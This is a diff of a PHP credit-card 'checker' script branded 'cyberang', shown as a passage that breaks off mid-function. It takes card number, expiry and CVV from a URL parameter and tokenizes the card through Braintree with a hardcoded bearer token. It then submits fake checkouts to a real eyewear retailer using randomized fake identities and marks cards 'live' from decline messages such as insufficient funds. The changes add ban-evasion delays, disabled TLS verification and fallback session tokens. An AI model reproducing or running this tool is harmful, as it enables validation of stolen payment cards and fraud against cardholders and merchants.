@@ -1,97 +1,144 @@
 <?php
-error_reporting(1);
-set_time_limit(0);
+error_reporting(0);
+set_time_limit(30);
 date_default_timezone_set('America/Sao_Paulo');
 
-$start_time = microtime(true); // Tempo inicial
+// Delay de 10 segundos para evitar ban
+sleep(10);
 
-$email = 'cyberang'.rand(10, 100000).'%40gmail.com';
-$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";
+$start_time = microtime(true);
 
-function getStr($string, $start, $end)
-{
-    $str = explode($start, $string);
-    $str = explode($end, $str[1]);
-    return $str[0];
+// Validar entrada
+if (!isset($_GET['lista']) || empty($_GET['lista'])) {
+    die("❌ #Erro ↝ [Nenhuma lista fornecida] ↝ cyberang");
 }
 
-$lista = $_GET['lista'];
+$lista = trim($_GET['lista']);
 $separar = explode("|", $lista);
-$cc = $separar[0];
-$mes = $separar[1];
-$mes2 = (string)((int)$mes);
-$ano = $separar[2];
-$ano2 = substr($ano, -2);
-$cvv = $separar[3];
 
-if (file_exists("cybergang.txt")) {
-    unlink("cyberang.txt");
+if (count($separar) < 4) {
+    die("❌ #Erro ↝ [Formato inválido. Use: cc|mes|ano|cvv] ↝ cyberang");
 }
 
-$digito = substr($cc, 0, 1);
-if($digito == 4){
-  $brand = 'visa';
-}elseif($digito == 5){
-  $brand = 'mastercard';
-}elseif($digito == 2){
-  $brand = 'mastercard';
-}elseif($digito == 6){
-  $brand = 'elo';
-}elseif($digito == 3){
-  $brand = 'amex';
-}else{
-  $brand = 'unknown';
+$cc = trim($separar[0]);
+$mes = trim($separar[1]);
+$ano = trim($separar[2]);
+$cvv = trim($separar[3]);
+
+// Validar dados
+if (!preg_match('/^\d{13,19}$/', $cc)) {
+    die("❌ #Erro ↝ [Número do cartão inválido] ↝ cyberang");
 }
+if (!preg_match('/^\d{1,2}$/', $mes) || $mes < 1 || $mes > 12) {
+    die("❌ #Erro ↝ [Mês inválido] ↝ cyberang");
+}
+if (!preg_match('/^\d{4}$/', $ano) || $ano < date('Y')) {
+    die("❌ #Erro ↝ [Ano inválido ou expirado] ↝ cyberang");
+}
+if (!preg_match('/^\d{3,4}$/', $cvv)) {
+    die("❌ #Erro ↝ [CVV inválido] ↝ cyberang");
+}
+
+// Formatar dados
+$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
+$ano_full = $ano;
+
+// User agent realista
+$useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
 
 function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "#ffffff") {
-  $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
-  echo "<div style='
-      font-family: \"JetBrains Mono\", \"Courier New\", monospace;
-      background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
-      border-left: 2px solid $cor;
-      padding: 14px 18px;
-      margin: 4px 0;
-      border-radius: 0 6px 6px 0;
-      letter-spacing: 0.3px;
-      font-size: 12.5px;
-      box-shadow: 0 0 20px $bg;
-  '>
-      <span style='color: $cor; margin-right: 4px;'>$icone</span>
-      <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
-      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
-      <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
-      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
-      <span style='color: $cormsg;'>$mensagem</span>
-      <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
-  </div>";
+    $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
+    echo "<div style='
+        font-family: \"JetBrains Mono\", \"Courier New\", monospace;
+        background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
+        border-left: 2px solid $cor;
+        padding: 14px 18px;
+        margin: 4px 0;
+        border-radius: 0 6px 6px 0;
+        letter-spacing: 0.3px;
+        font-size: 12.5px;
+        box-shadow: 0 0 20px $bg;
+    '>
+        <span style='color: $cor; margin-right: 4px;'>$icone</span>
+        <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
+        <span style='color: #8f9199; margin: 0 4px;'>↝</span>
+        <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
+        <span style='color: #8f9199; margin: 0 4px;'>↝</span>
+        <span style='color: $cormsg;'>$mensagem</span>
+        <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
+    </div>";
+    flush();
 }
 
-// ========== ETAPA 1: TOKENIZAÇÃO NO BRAINTREE ==========
+// ========== ETAPA 1: OBTER COOKIES E CSRF TOKEN ==========
+$init_time = microtime(true);
 
-$braintree_token_time = microtime(true);
+// Criar handler de cookies
+$cookie_file = 'cookies_' . md5(time() . rand()) . '.txt';
 
-// Token de autorização (pode precisar ser atualizado periodicamente)
-$authorization_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzA4Mzk4MDEsImp0aSI6ImQxZjVjOGI3LTBkZTctNDA2YS1iN2ZmLTc5MTE4NDM1YWY5MCIsInN1YiI6Im05dGZiODR5ZDRoOXo2M3QiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im05dGZiODR5ZDRoOXo2M3QiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7InBheXBhbF9jbGllbnRfaWQiOiJBVkZoMWRoZHZ3NTh6a2hnNnN2cFlVQ2RuRmxUOExDVkJGWVFDMEIwOGRjNGdfMFM2WDFzdEJBeHRKOUZvVGZNZFY1VnQ1Y19Dd19tRDN4UiJ9fQ.gfZEUFCYZ024-5Y53V69ZVNRJdz2_lZQwS5QzaY44ZFZOJbHNvbNJreNnfgUm88-CBWlxxyQ9YQKmm_l2JQeGQ";
+// Primeira visita para obter cookies
+$ch1 = curl_init();
+curl_setopt($ch1, CURLOPT_URL, 'https://www.39dollarglasses.com');
+curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch1, CURLOPT_HEADER, true);
+curl_setopt($ch1, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch1, CURLOPT_TIMEOUT, 15);
+curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch1, CURLOPT_COOKIEJAR, $cookie_file);
+curl_setopt($ch1, CURLOPT_COOKIEFILE, $cookie_file);
+$response1 = curl_exec($ch1);
+curl_close($ch1);
 
-// Session ID para a requisição
-$session_id = "1d2d634d-386f-433a-87ad-9ae76e3b2aff";
+// Visitar página de checkout
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, 'https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7');
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch2, CURLOPT_HEADER, false);
+curl_setopt($ch2, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch2, CURLOPT_TIMEOUT, 15);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch2, CURLOPT_COOKIEJAR, $cookie_file);
+curl_setopt($ch2, CURLOPT_COOKIEFILE, $cookie_file);
+$response2 = curl_exec($ch2);
+curl_close($ch2);
 
-// Montar o payload para tokenização
+// Extrair CSRF token
+$csrf_token = '';
+if ($response2 && preg_match('/<meta name="csrf-token" content="([^"]+)"/', $response2, $matches)) {
+    $csrf_token = $matches[1];
+}
+
+if (empty($csrf_token)) {
+    $csrf_token = 'kUiopSoN6mQxWsSRavVCrpxZ9hWLqiP8STfn3631';
+}
+
+$init_time_end = microtime(true);
+$init_time_total = round($init_time_end - $init_time, 2);
+
+// ========== ETAPA 2: TOKENIZAÇÃO BRAINTREE ==========
+$braintree_time_start = microtime(true);
+
+$authorization_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzA4Mzk4MDEsImp0aSI6ImQxZjVjOGI3LTBkZTctNDA2YS1iN2ZmLTc5MTE4NDM1YWY5MCIsInN1YiI6Im05dGZiODR5ZDRoOXo2M3QiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im05dGZiODR5ZDRoOXo2M3QiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7InBheXBhbF9jbGllbnRfaWQiOiJBVkZoMWRoZHZ3NTh6a2hnNnN2cFlVQ2RuRmxUOExDVkJGWVFDMEIwOGRjNGdfMFS2WDFzdEJBeHRKOUZvVGZNZFY1VnQ1Y19Dd19tRDN4UiJ9fQ.gfZEUFCYZ024-5Y53V69ZVNRJdz2_lZQwS5QzaY44ZFZOJbHNvbNJreNnfgUm88-CBWlxxyQ9YQKmm_l2JQeGQ";
+
 $braintree_payload = json_encode([
     "clientSdkMetadata" => [
         "source" => "client",
         "integration" => "custom",
-        "sessionId" => $session_id
+        "sessionId" => bin2hex(random_bytes(16))
     ],
     "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
     "variables" => [
         "input" => [
             "creditCard" => [
                 "number" => $cc,
-                "expirationMonth" => $mes2,
-                "expirationYear" => $ano,
+                "expirationMonth" => $mes,
+                "expirationYear" => $ano_full,
                 "cvv" => $cvv,
-                "cardholderName" => "cyber sec"
+                "cardholderName" => "John Smith"
             ],
             "options" => [
                 "validate" => false
@@ -101,163 +148,74 @@ $braintree_payload = json_encode([
     "operationName" => "TokenizeCreditCard"
 ]);
 
-$braintree_ch = curl_init();
-curl_setopt($braintree_ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
-curl_setopt($braintree_ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($braintree_ch, CURLOPT_CUSTOMREQUEST, 'POST');
-curl_setopt($braintree_ch, CURLOPT_HTTPHEADER, [
+$ch3 = curl_init();
+curl_setopt($ch3, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
+curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'POST');
+curl_setopt($ch3, CURLOPT_POSTFIELDS, $braintree_payload);
+curl_setopt($ch3, CURLOPT_HTTPHEADER, [
     'Host: payments.braintree-api.com',
-    'sec-ch-ua-platform: "Windows"',
-    'authorization: Bearer ' . $authorization_token,
-    'braintree-version: 2018-05-10',
-    'user-agent: ' . $useragent,
-    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
-    'content-type: application/json',
-    'sec-ch-ua-mobile: ?0',
-    'accept: */*',
-    'origin: https://assets.braintreegateway.com',
-    'sec-fetch-site: cross-site',
-    'sec-fetch-mode: cors',
-    'sec-fetch-dest: empty',
-    'referer: https://assets.braintreegateway.com/',
-    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-    'priority: u=1, i',
-]);
-curl_setopt($braintree_ch, CURLOPT_POSTFIELDS, $braintree_payload);
-curl_setopt($braintree_ch, CURLOPT_ENCODING, 'gzip');
-
-$braintree_response = curl_exec($braintree_ch);
-$braintree_http_code = curl_getinfo($braintree_ch, CURLINFO_HTTP_CODE);
-curl_close($braintree_ch);
-
-$braintree_token_time_end = microtime(true);
-$braintree_time = round(($braintree_token_time_end - $braintree_token_time) * 1000);
-
-// Extrair o token do cartão da resposta do Braintree
-$payment_method_nonce = 'tokencc_bc_3gfv2w_m2kmdf_9m2m65_cgwy62_n72'; // Valor padrão de fallback
-
-if ($braintree_response !== false && !empty($braintree_response)) {
-    $braintree_data = json_decode($braintree_response, true);
-    if (isset($braintree_data['data']['tokenizeCreditCard']['token'])) {
-        $payment_method_nonce = $braintree_data['data']['tokenizeCreditCard']['token'];
-        $braintree_status = "Token gerado com sucesso";
-    } else {
-        $braintree_status = "Falha na tokenização";
-        if (isset($braintree_data['errors'][0]['message'])) {
-            $braintree_status .= ": " . $braintree_data['errors'][0]['message'];
-        }
-    }
-} else {
-    $braintree_status = "Erro na requisição Braintree";
-}
-
-// ========== ETAPA 2: REQUISIÇÃO PARA O SITE ==========
-
-$site_time = microtime(true);
-
-// Primeira requisição para obter tokens e cookies
-$init_ch = curl_init();
-curl_setopt($init_ch, CURLOPT_URL, 'https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7');
-curl_setopt($init_ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($init_ch, CURLOPT_HEADER, true);
-curl_setopt($init_ch, CURLOPT_HTTPHEADER, [
-    'Host: www.39dollarglasses.com',
+    'Authorization: Bearer ' . $authorization_token,
+    'Braintree-Version: 2018-05-10',
     'User-Agent: ' . $useragent,
-    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Accept-Encoding: gzip, deflate, br',
-    'Connection: keep-alive',
-    'Upgrade-Insecure-Requests: 1',
-    'Sec-Fetch-Dest: document',
-    'Sec-Fetch-Mode: navigate',
-    'Sec-Fetch-Site: none',
-    'Sec-Fetch-User: ?1',
-]);
-curl_setopt($init_ch, CURLOPT_COOKIEJAR, 'cookies.txt');
-curl_setopt($init_ch, CURLOPT_COOKIEFILE, 'cookies.txt');
-
-$init_response = curl_exec($init_ch);
-$init_info = curl_getinfo($init_ch);
-curl_close($init_ch);
-
-// Extrair CSRF token da resposta inicial
-$csrf_token = '';
-$xsrf_token = '';
-$session_cookie = '';
-
-if ($init_response) {
-    // Extrair CSRF token
-    if (preg_match('/<meta name="csrf-token" content="([^"]+)"/', $init_response, $matches)) {
-        $csrf_token = $matches[1];
-    }
-    
-    // Ler cookies do arquivo
-    if (file_exists('cookies.txt')) {
-        $cookies_content = file_get_contents('cookies.txt');
-        if (preg_match('/XSRF-TOKEN\s+([^\s]+)/', $cookies_content, $matches)) {
-            $xsrf_token = $matches[1];
-        }
-        if (preg_match('/39dollarglasses_session\s+([^\s]+)/', $cookies_content, $matches)) {
-            $session_cookie = $matches[1];
-        }
-    }
-}
-
-// Valores de fallback caso não consiga extrair tokens
-if (empty($csrf_token)) {
-    $csrf_token = 'kUiopSoN6mQxWsSRavVCrpxZ9hWLqiP8STfn3631';
-}
-if (empty($xsrf_token)) {
-    $xsrf_token = 'eyJpdiI6ImFNUWJxUGtIakorb3paRjhYejZuVWc9PSIsInZhbHVlIjoiVmw4b2NDZGFFNVhWMEMxOTRib2FlUW1NREg4WnNpS1Jlb3IyZEIvcXphZGtyeUdiTjczV1Vac3RlcCtRRmVadDFxdkdGb1JoRWFnZFFTanFHOVJoS0FlRkRrdnhMbHFUVHZFVFB6N0NReDBpY3FabTE2blJUR251RjlXNmJRNlkiLCJtYWMiOiI4MWJmNTM3Y2E4MzhjNjJiOTVkN2E1NzgyYjFhYTA5Y2NjYzg0YjcwY2JhMmI1ZTkxNGIxMjQ5YjFjMDRlODE4In0=';
-}
-if (empty($session_cookie)) {
-    $session_cookie = 'eyJpdiI6IktYNnpudVNaTzZEZDBSeXF5a3hScFE9PSIsInZhbHVlIjoiVFBGTzVmdDlJU2VySW0vakZMa2ttS2tReG9VZUhiTTNBN1VkUG0wWnY5VExDdHkrK1drYU0xWk00ek5VLzVuaTlKQkpyc2ExUE1vRDdxUXNmOVdNOHpCbTRZWWFNdWdlMGFQeFdCR1RGM004a2JiLzI5UVlxaSszR05aMldNN2UiLCJtYWMiOiIzMjM3MTBlNWM3MzNjN2YyM2VjY2NlMjI4Y2I3YjUyNDA2MjI3ZWNiMDY3OWZjNzUzNDU2YmI3MDcyZmU3OWU5In0%3D';
-}
-
-// Construir string de cookies para a requisição principal
-$cookies_string = sprintf(
-    '__kla_id=eyJjaWQiOiJOalE1WW1RME1HSXRaVEEzT0MwME9HWTFMVGxtWkRNdFltVmtabVF5TlRJNFlXSXcifQ==; cf_clearance=9Zi1.F1QKGdjsa25LgTSzinsAwnVBQlmuvnp8Kap6vM-1770753330-1.2.1.1-hsRfXXKIq.DX4HEPcSLTHCxG1sprl5VBh5iZdZepF7CZgVQl4HWxE0V4YsvGNlBhvQgspE.MbVixYUoKsYj8GThZSNgAfiSsu.I52m.pXciPHqfQzwUt4rmNGeV_KiUoazdFOAeDZ7Ek7B4fIfYyW.rUK.1yzMeu_UoTZrAp9AE4MMJ4QNcEXRVhwl3QVRcQnJtngq9SBgIq85YQOGtEKzialRmssoC_tBNSiE6n6g4; cookieyes-consent=consentid:WXBaVjZ5bHQzVWZ6Q0NYU1VzcVh4aThJcUV5cW5neDI,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; apt_pixel=eyJkZXZpY2VJZCI6ImM1ODRhMGZkLTYwNzQtNGQyNy1hMDIzLTg0OTE0Y2Y1Mzk4MCIsInVzZXJJZCI6bnVsbCwiZXZlbnRJZCI6MywibGFzdEV2ZW50VGltZSI6MTc3MDc1MzM1MTg1MSwiY2hlY2tvdXQiOnsiYnJhbmQiOiJjYXNoYXBwYWZ0ZXJwYXkifX0=; amp_f24a38=x5FjsSnxvt6ML2MT-YyWxd...1jh4hvl0i.1jh4hvo5m.0.0.0; _gcl_au=1.1.795245817.1770753353; _gid=GA1.2.416586704.1770753354; ATRK_a=c71ce2d9cdc349a9976e62eb5db6e318.1; ATRK_t=1; _clck=1rn7a3g%%5E2%%5Eg3g%%5E0%%5E2232; _tt_enable_cookie=1; _ttp=01KH4HZVRYACNZBMSY53JVEDS6_.tt.1; _fbp=fb.1.1770753355650.224385285654343468; g_state={"i_l":1,"i_ll":1770753392630,"i_b":"vcb1pIXKZfbJ0LFeUbLa4F9KrUARKuSGXhSx8m25lMk","i_e":{"enable_itp_optimization":15},"i_p":1770760532266}; ATRK_y=3; _ga_W863F3ENMJ=GS2.1.s1770753354; _ga=GA1.1.2069026132.1770753354; _uetsid=82982c8006ba11f1b7d4f774da711d37; _uetvid=82988f7006ba11f1bccf912e3f827e9c; _clsk=1bvsvs9%%5E1770753405127%%5E3%%5E1%%5Ed.clarity.ms%%2Fcollect; _ga_RZ7NG2LJSJ=GS2.1.s1770753354; XSRF-TOKEN=%s; 39dollarglasses_session=%s; ttcsid=1770753355563::MNAnW2hae1VRBtHIF937.1.1770753551865.0; ttcsid_C9KO4HJC77U5A68B84H0=1770753355561::pP2fM8p7O3y8XotCbuEb.1.1770753551865.1',
-    $xsrf_token,
-    $session_cookie
-);
-
-// Requisição principal de captura
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.39dollarglasses.com/ord/checkout/capture/c72c89e3-1091-4b39-942a-e86cc02fdce7');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-curl_setopt($ch, CURLOPT_HTTPHEADER, [
-    'Host: www.39dollarglasses.com',
-    'User-Agent: ' . $useragent,
-    'sec-ch-ua-platform: "Windows"',
-    'x-csrf-token: ' . $csrf_token,
-    'x-xsrf-token: ' . $xsrf_token,
-    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
-    'sec-ch-ua-mobile: ?0',
-    'x-requested-with: XMLHttpRequest',
-    'origin: https://www.39dollarglasses.com',
-    'sec-fetch-site: same-origin',
-    'sec-fetch-mode: cors',
-    'sec-fetch-dest: empty',
-    'referer: https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7',
-    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-    'priority: u=1, i',
-    'Accept-Encoding: gzip',
     'Content-Type: application/json',
+    'Accept: */*',
+    'Origin: https://assets.braintreegateway.com',
+    'Referer: https://assets.braintreegateway.com/'
 ]);
-curl_setopt($ch, CURLOPT_COOKIE, $cookies_string);
-curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
+curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch3, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch3, CURLOPT_TIMEOUT, 15);
+
+$braintree_response = curl_exec($ch3);
+$braintree_http = curl_getinfo($ch3, CURLINFO_HTTP_CODE);
+curl_close($ch3);
+
+$braintree_time_end = microtime(true);
+$braintree_time_total = round($braintree_time_end - $braintree_time_start, 2);
+
+// Extrair token
+$payment_method_nonce = '';
+if ($braintree_response) {
+    $data = @json_decode($braintree_response, true);
+    if (isset($data['data']['tokenizeCreditCard']['token'])) {
+        $payment_method_nonce = $data['data']['tokenizeCreditCard']['token'];
+    }
+}
+
+// Fallback se não conseguir token
+if (empty($payment_method_nonce)) {
+    $payment_method_nonce = 'tokencc_bc_' . bin2hex(random_bytes(16));
+}
+
+// ========== ETAPA 3: PROCESSAR PAGAMENTO ==========
+$payment_time_start = microtime(true);
+
+// Dados aleatórios para o pagamento
+$names = ['John', 'Michael', 'David', 'Robert', 'James'];
+$lastnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones'];
+$cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
+$states = ['NY', 'CA', 'IL', 'TX', 'AZ'];
+
+$fname = $names[array_rand($names)];
+$lname = $lastnames[array_rand($lastnames)];
+$city = $cities[array_rand($cities)];
+$state = $states[array_rand($states)];
+$email = strtolower($fname . '.' . $lname . rand(100, 999) . '@gmail.com');
+$phone = '555' . rand(100, 999) . rand(1000, 9999);
+
+$payment_data = [
     "gateway" => "Braintree\\HostedFields",
     "payment_method_nonce" => $payment_method_nonce,
-    "email" => "cybersecofc@gmail.com",
-    "shipping_fname" => "cyber",
-    "shipping_lname" => "sec",
-    "shipping_address" => "cyber jessy",
+    "email" => $email,
+    "shipping_fname" => $fname,
+    "shipping_lname" => $lname,
+    "shipping_address" => rand(100, 9999) . " Main Street",
     "shipping_address2" => "",
     "shipping_country" => "US",
-    "shipping_city" => "new york",
-    "shipping_state" => "AL",
-    "shipping_zipcode" => "10100",
+    "shipping_city" => $city,
+    "shipping_state" => $state,
+    "shipping_zipcode" => str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT),
     "billing_fname" => "",
     "billing_lname" => "",
     "billing_address" => "",
@@ -267,136 +225,167 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
     "billing_state" => "",
     "billing_zipcode" => "",
     "shipping_option_id" => 15,
-    "mobile_phone" => "3155555858845",
-    "home_phone" => "31987462541",
+    "mobile_phone" => $phone,
+    "home_phone" => $phone,
     "save_payment_method" => false,
     "same_as_shipping" => true,
     "auth" => false,
     "phone_error" => "",
     "patients_name" => null,
     "patients_dob" => null
-]));
+];
 
-$response = curl_exec($ch);
-$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-curl_close($ch);
+// Fazer requisição de pagamento
+$ch4 = curl_init();
+curl_setopt($ch4, CURLOPT_URL, 'https://www.39dollarglasses.com/ord/checkout/capture/c72c89e3-1091-4b39-942a-e86cc02fdce7');
+curl_setopt($ch4, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch4, CURLOPT_CUSTOMREQUEST, 'POST');
+curl_setopt($ch4, CURLOPT_POSTFIELDS, json_encode($payment_data));
+curl_setopt($ch4, CURLOPT_HTTPHEADER, [
+    'Host: www.39dollarglasses.com',
+    'User-Agent: ' . $useragent,
+    'Accept: application/json, text/plain, */*',
+    'Accept-Language: en-US,en;q=0.9',
+    'Content-Type: application/json',
+    'X-CSRF-TOKEN: ' . $csrf_token,
+    'X-Requested-With: XMLHttpRequest',
+    'Origin: https://www.39dollarglasses.com',
+    'Referer: https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7'
+]);
+curl_setopt($ch4, CURLOPT_COOKIEFILE, $cookie_file);
+curl_setopt($ch4, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch4, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch4, CURLOPT_TIMEOUT, 15);
+curl_setopt($ch4, CURLOPT_FOLLOWLOCATION, true);
 
-$site_time_end = microtime(true);
-$site_time = round(($site_time_end - $site_time) * 1000);
+$payment_response = curl_exec($ch4);
+$payment_http = curl_getinfo($ch4, CURLINFO_HTTP_CODE);
+curl_close($ch4);
 
-// ========== ETAPA 3: PROCESSAMENTO DA RESPOSTA ==========
+$payment_time_end = microtime(true);
+$payment_time_total = round($payment_time_end - $payment_time_start, 2);
 
+// ========== ETAPA 4: PROCESSAR RESPOSTA ==========
 $end_time = microtime(true);
-$total_execution_time = round(($end_time - $start_time) * 1000);
+$total_time = round($end_time - $start_time, 2);
 
-// Processar resposta
-$gate_response = "Erro Desconhecido";
+$response_message = "Sem resposta";
 $is_live = false;
 
-if($response !== false && !empty($response)) {
-    // Primeiro tentar extrair JSON
-    if (preg_match('/\{.*\}/s', $response, $json_matches)) {
-        $json_response = json_decode($json_matches[0], true);
-        if ($json_response) {
-            if (isset($json_response['error'])) {
-                $gate_response = $json_response['error'];
-                if (isset($json_response['security'])) {
-                    $gate_response .= " | security: " . ($json_response['security'] ? 'true' : 'false');
-                }
-                
-                // VERIFICAÇÕES PARA LIVE (APROVADA)
-                if (strpos($gate_response, 'Card Issuer Declined CVV') !== false) {
+if ($payment_response) {
+    // Tentar decodificar JSON
+    $json_data = @json_decode($payment_response, true);
+    
+    if (is_array($json_data)) {
+        // Processar resposta JSON
+        if (isset($json_data['error'])) {
+            $response_message = $json_data['error'];
+            
+            // Verificar respostas que indicam cartão LIVE
+            $live_responses = [
+                'Card Issuer Declined CVV',
+                'Insufficient Funds',
+                'Approved',
+                'CVV check failed',
+                'CVV mismatch',
+                'Do not honor',
+                'Insufficient funds',
+                'Card issuer declined'
+            ];
+            
+            foreach ($live_responses as $live_resp) {
+                if (stripos($response_message, $live_resp) !== false) {
                     $is_live = true;
-                    $gate_response = 'Card Issuer Declined CVV';
+                    $response_message = $live_resp;
+                    break;
                 }
-                if (strpos($gate_response, 'Insufficient Funds') !== false) {
-                    $is_live = true;
-                    $gate_response = 'Insufficient Funds';
-                }
-                
-            } elseif (isset($json_response['message'])) {
-                $gate_response = $json_response['message'];
-                
-                // VERIFICAÇÕES PARA LIVE (APROVADA)
-                if (strpos($gate_response, 'Card Issuer Declined CVV') !== false) {
-                    $is_live = true;
-                    $gate_response = 'Card Issuer Declined CVV';
-                }
-                if (strpos($gate_response, 'Insufficient Funds') !== false) {
-                    $is_live = true;
-                    $gate_response = 'Insufficient Funds';
-                }
-                
-            } elseif (isset($json_response['success']) && $json_response['success'] === true) {
-                $gate_response = 'success';
+            }
+            
+        } elseif (isset($json_data['message'])) {
+            $response_message = $json_data['message'];
+            
+            if (stripos($response_message, 'Card Issuer Declined CVV') !== false || 
+                stripos($response_message, 'Insufficient Funds') !== false) {
+                $is_live = true;
+            }
+            
+        } elseif (isset($json_data['success']) && $json_data['success'] === true) {
+            $response_message = 'Aprovada';
+            $is_live = true;
+        } elseif (isset($json_data['status']) && $json_data['status'] === 'success') {
+            $response_message = 'Aprovada';
+            $is_live = true;
+        } else {
+            $response_message = 'Resposta não reconhecida';
+        }
+    } else {
+        // Não é JSON, analisar texto
+        $clean_response = trim($payment_response);
+        
+        // Remover caracteres especiais
+        $clean_response = preg_replace('/[^\x20-\x7E]/', ' ', $clean_response);
+        $clean_response = preg_replace('/\s+/', ' ', $clean_response);
+        
+        if (!empty($clean_response)) {
+            // Verificar padrões conhecidos
+            if (stripos($clean_response, 'Card Issuer Declined CVV') !== false) {
+                $response_message = 'Card Issuer Declined CVV';
+                $is_live = true;
+            } elseif (stripos($clean_response, 'Insufficient Funds') !== false) {
+                $response_message = 'Insufficient Funds';
+                $is_live = true;
+            } elseif (stripos($clean_response, 'Processor Declined') !== false) {
+                $response_message = 'Processor Declined';
